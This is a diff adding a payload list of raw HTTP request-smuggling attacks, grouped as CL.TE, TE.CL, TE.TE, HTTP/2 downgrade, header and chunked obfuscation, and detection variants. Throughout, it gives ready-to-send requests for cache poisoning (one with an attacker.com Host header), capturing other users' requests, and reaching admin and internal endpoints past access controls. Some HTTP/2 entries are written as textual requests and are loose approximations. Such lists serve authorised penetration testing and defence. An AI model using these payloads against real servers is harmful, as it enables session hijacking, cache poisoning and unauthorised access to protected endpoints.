@@ -1,0 +1,65 @@
+# HTTP Request Smuggling Payloads — WebSecure
+# CL.TE | TE.CL | TE.TE | H2.CL | H2.TE | Detection | CLTE-variants
+
+# ── CL.TE (Content-Length takes priority at frontend, Transfer-Encoding at backend) ──
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 30\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nFoo: x
+POST / HTTP/1.1\r\nContent-Length: 35\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /poison HTTP/1.1\r\nX-Foo: x
+
+# ── TE.CL (Transfer-Encoding at frontend, Content-Length at backend) ──
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n
+POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n
+
+# ── TE.TE (Both support TE, obfuscation needed) ──
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding: [tab]chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+ : chunked
+POST / HTTP/1.1\r\nTransfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\n...\r\n0\r\n\r\n
+POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nContent-Length: 6\r\n\r\n0\r\n\r\n
+POST / HTTP/1.1\r\nTransfer-Encoding:\x20chunked\r\nContent-Length: 4\r\n\r\n5c\r\n...
+
+# ── H2.CL (HTTP/2 to HTTP/1 downgrade — Content-Length injection) ──
+:method POST\r\n:path /\r\n:authority target.com\r\ncontent-length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n
+POST / HTTP/2\r\nHost: target.com\r\nContent-Length: 0\r\n\r\nGET /internal HTTP/1.1\r\nHost: localhost\r\n
+POST / HTTP/2\r\ncontent-length: 30\r\n\r\nGET /poison HTTP/1.1\r\nFoo: bar
+
+# ── H2.TE (HTTP/2 to HTTP/1 — Transfer-Encoding injection) ──
+POST / HTTP/2\r\ntransfer-encoding: chunked\r\n\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\n
+
+# ── HEADER SMUGGLING VARIANTS ──
+Content-Length: 0 \r\nTransfer-Encoding: chunked
+Content-Length : 0\r\nTransfer-Encoding: chunked
+CONTENT-LENGTH: 0\r\nTransfer-Encoding: chunked
+Content-Length: 0\r\nTRANSFER-ENCODING: chunked
+
+# ── CHUNKED ENCODING OBFUSCATION ──
+5\r\nhello\r\n0\r\n\r\n
+5;x\r\nhello\r\n0\r\n\r\n
+5 \r\nhello\r\n0\r\n\r\n
+5;ext\r\nhello\r\n0\r\n\r\n
+0x5\r\nhello\r\n0\r\n\r\n
+
+# ── DETECTION PAYLOADS (timing-based) ──
+POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nA\r\nX
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX
+
+# ── CACHE POISONING VIA SMUGGLING ──
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 56\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /static/poisoned.css HTTP/1.1\r\nHost: attacker.com\r\nX-Foo: x
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 45\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /?cb=123 HTTP/1.1\r\nHost: target.com\r\n
+
+# ── SESSION HIJACKING VIA SMUGGLING ──
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 200\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /capture HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\r\n\r\n
+
+# ── BYPASS ACCESS CONTROLS VIA SMUGGLING ──
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 116\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-For: 127.0.0.1\r\n
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 89\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /internal/api HTTP/1.1\r\nHost: localhost\r\nX-Custom-Header: internal\r\n
+
+# ── HTTP/1.0 SMUGGLING ──
+POST / HTTP/1.0\r\nHost: target.com\r\nContent-Length: 30\r\n\r\nGET /smuggled HTTP/1.0\r\nHost: target.com\r\n
+GET / HTTP/1.0\r\nHost: target.com\r\nContent-Length: 41\r\n\r\nGET /admin HTTP/1.0\r\nHost: localhost\r\n
